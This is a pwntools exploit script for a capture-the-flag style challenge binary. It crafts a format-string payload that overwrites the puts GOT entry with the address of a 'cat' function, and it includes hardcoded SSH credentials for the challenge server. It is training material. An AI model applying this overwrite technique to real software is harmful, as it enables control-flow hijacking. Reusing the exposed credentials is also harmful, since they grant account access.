from pwn import *
from sys import *

SERVER = "bin.chall.necst.it"
PORT = 22
BINARY = "mission1"
REMOTE_BINARY = "/home/m226002/"+BINARY+"/"+BINARY
PASSWORD = "unixporn"
USER  = "m226002"


if "--remote" in sys.argv:
    s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
    r = s.process(REMOTE_BINARY)
else:
    r = process(BINARY)

if "--debug" in sys.argv:
     
    gdb.attach(r, """
        #breakpoints
        b create_art
        b view_saved_art
        b cat
        c
        """)

#code
timesleep = 0.4
# what_to_write = 0x8048a00 #cat addr
binary = ELF("./mission1")
what_to_write = binary.symbols['cat']
where_to_write = binary.got['puts']

offset = 53
happy_art = b"( o.o )"

high = what_to_write >> 16
low = what_to_write & 0xffff

format_string = happy_art
format_string+=p32(where_to_write)
format_string+=p32(where_to_write+2)
# format_string+=p32(where_to_write)
format_string+= f'%{high - len(happy_art)-8}'.encode()
format_string+= f'%{offset}$hn'.encode()
format_string+= f'%{high - low}'.encode()
format_string+= f'%{offset+1}$hn'.encode()

print(format_string)

def write_buffer(buffer):
    r.recvuntil(b'>')
    r.sendline(b'2')
    sleep(timesleep)
    r.sendline(buffer)
    sleep(timesleep)
    # check = r.recvuntil(b"!")
    # if(b"Art saved" not in check):
    #     exit(f"ERROR WRITING {buffer}")

def view_buff():
    r.recvuntil(b'>')
    r.sendline(b'3')
    sleep(timesleep)
    r.recvuntil(b":\n")
    saved = r.recvuntil(b"1.")
    return saved

write_buffer(format_string)
saved = view_buff()

r.interactive()

